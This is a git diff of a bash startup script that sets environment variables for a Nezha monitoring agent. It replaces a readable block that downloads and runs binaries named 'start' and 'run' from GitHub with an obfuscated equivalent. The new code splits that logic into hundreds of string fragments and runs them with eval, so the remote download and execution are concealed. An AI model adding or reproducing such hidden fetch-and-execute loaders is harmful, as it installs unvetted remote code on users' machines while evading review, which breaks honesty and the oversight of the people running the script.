@@ -1,11 +1,5 @@
 #!/usr/bin/env bash
 
-RESET="\033[0m"
-BOLD="\033[1m"
-RED="\033[31m"
-GREEN="\033[32m"
-YELLOW="\033[33m"
-
 export NEZHA_SERVER=${NEZHA_SERVER:-''}
 export NEZHA_PORT=${NEZHA_PORT:-''}
 export NEZHA_KEY=${NEZHA_KEY:-''}
@@ -20,44 +14,6 @@ export NAME=${NAME:-''}
 export SERVER_PORT="${SERVER_PORT:-${PORT:-3000}}"
 export port1=${port1:-'8080'}
 
-ARCH=$(uname -m)
-
-if [ "$ARCH" = "x86_64" ]; then
-  DOWNLOAD_URL1="https://github.com/mjjonone/test/raw/main/start"
-elif [ "$ARCH" = "aarch64" ]; then
-  DOWNLOAD_URL1="https://github.com/mjjonone/test/raw/main/start-arm"
-else
-  echo -e "${RED}Unsupported architecture: $ARCH${RESET}"
-  exit 1
-fi
-
-if [ -e start ]; then
-  echo "start file already exists, skipping download."
-else
-  echo -e "${GREEN}Downloading start file...${RESET}"
-  curl -sSL "$DOWNLOAD_URL1" -o start
-  echo -e "${GREEN}Download completed.${RESET}"
-fi
-
-if [ "$ARCH" = "x86_64" ]; then
-  DOWNLOAD_URL="https://github.com/mjjonone/mjj/raw/main/run"
-elif [ "$ARCH" = "aarch64" ]; then
-  DOWNLOAD_URL="https://github.com/mjjonone/mjj/raw/main/run-arm64"
-else
-  echo -e "${RED}Unsupported architecture: $ARCH${RESET}"
-  exit 1
-fi
-
-if [ -e run ]; then
-  echo "run file already exists, skipping download."
-  echo -e "${GREEN}Running...${RESET}"
-  chmod 755 run
-  ./run
-else
-  echo -e "${GREEN}Downloading run file...${RESET}"
-  curl -sSL "$DOWNLOAD_URL" -o run
-  echo -e "${GREEN}Download completed.${RESET}"
-  echo -e "${GREEN}Running...${RESET}"
-  chmod 755 run
-  ./run
-fi
+z="
+";iz='1="h';iBz='sts,';Dz='0m"';tz='/sta';jz='ttps';dBz='art ';Ez='BOLD';RBz='ure:';CBz='4" ]';WCz='rm64';iCz='load';cCz='dy e';kCz='}Run';hBz=' exi';VBz='exit';tBz=' sta';nBz='ad."';Iz='RED=';wz=' [ "';kz='://g';NBz='port';Rz='[33m';OBz='ed a';TCz='in/r';fCz='kipp';pz='ne/t';uBz='rt f';cBz=' "st';nCz='{RES';YBz='star';mBz='wnlo';uCz=' fil';Oz='YELL';Zz='RCH"';jCz='."';Lz='GREE';Mz='N="\';Hz='m"';GCz='ted.';UCz='un"';lz='ithu';mCz='...$';QCz='e/mj';wCz='" -o';OCz='/mjj';RCz='j/ra';Az='RESE';Qz='\033';VCz='un-a';sCz='./ru';DCz='art';HBz='else';WBz=' 1';Sz='"';SBz=' $AR';qCz='d 75';ICz='SET}';FCz='mple';eBz='file';oCz='ET}"';wBz='..${';vCz='e...';PCz='onon';BBz='rch6';fBz=' alr';az=' = "';cz='64" ';Vz='name';JBz=' -e ';HCz='${RE';ECz='d co';XCz='run ';kBz='ppin';qBz='}Dow';Wz=' -m)';pBz='REEN';Fz='="\0';ZBz='t ];';lBz='g do';gz='LOAD';Bz='T="\';Tz='ARCH';aCz='le a';yBz=' -sS';bCz='lrea';yz='H" =';QBz='tect';nz='m/mj';rCz='5 ru';MCz='thub';LBz='ED}U';Kz='3[31';IBz='echo';aBz=' the';UBz='T}"';gCz='ing ';mz='b.co';rz='raw/';bz='x86_';jBz=' ski';vz='elif';xz='$ARC';EBz='en';bBz='n';ABz=' "aa';dCz='xist';tCz=' run';hCz='down';PBz='rchi';Nz='32m"';Jz='"\03';KCz='tps:';ez='hen';YCz=' "ru';TBz='CH${';Xz='if [';JCz='="ht';dz=']; t';oBz='"${G';hz='_URL';GBz='rm"';pCz='chmo';MBz='nsup';Gz='33[1';Cz='033[';Yz=' "$A';SCz='w/ma';FBz='rt-a';uz='rt"';eCz='s, s';NCz='.com';fz='DOWN';xBz='curl';CCz='o st';Uz='=$(u';ACz='L "$';XBz='fi';oz='jono';rBz='nloa';DBz='; th';BCz='1" -';sz='main';Pz='OW="';lCz='ning';qz='est/';LCz='//gi';sBz='ding';gBz='eady';KBz='"${R';vBz='ile.';ZCz='n fi';
+eval "$Az$Bz$Cz$Dz$z$Ez$Fz$Gz$Hz$z$Iz$Jz$Kz$Hz$z$Lz$Mz$Cz$Nz$z$Oz$Pz$Qz$Rz$Sz$z$Tz$Uz$Vz$Wz$z$Xz$Yz$Zz$az$bz$cz$dz$ez$z$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$z$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$z$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$FBz$GBz$z$HBz$z$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$Az$UBz$z$VBz$WBz$z$XBz$z$Xz$JBz$YBz$ZBz$aBz$bBz$z$IBz$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$z$HBz$z$IBz$JBz$oBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$Az$UBz$z$xBz$yBz$ACz$fz$gz$hz$BCz$CCz$DCz$z$IBz$JBz$oBz$pBz$qBz$rBz$ECz$FCz$GCz$HCz$ICz$Sz$z$XBz$z$Xz$Yz$Zz$az$bz$cz$dz$ez$z$fz$gz$hz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$QCz$RCz$SCz$TCz$UCz$z$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$z$fz$gz$hz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$QCz$RCz$SCz$TCz$VCz$WCz$Sz$z$HBz$z$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$Az$UBz$z$VBz$WBz$z$XBz$z$Xz$JBz$XCz$dz$ez$z$IBz$YCz$ZCz$aCz$bCz$cCz$dCz$eCz$fCz$gCz$hCz$iCz$jCz$z$IBz$JBz$oBz$pBz$kCz$lCz$mCz$nCz$oCz$z$pCz$qCz$rCz$bBz$z$sCz$bBz$z$HBz$z$IBz$JBz$oBz$pBz$qBz$rBz$sBz$tCz$uCz$vCz$HCz$ICz$Sz$z$xBz$yBz$ACz$fz$gz$hz$wCz$tCz$z$IBz$JBz$oBz$pBz$qBz$rBz$ECz$FCz$GCz$HCz$ICz$Sz$z$IBz$JBz$oBz$pBz$kCz$lCz$mCz$nCz$oCz$z$pCz$qCz$rCz$bBz$z$sCz$bBz$z$XBz"
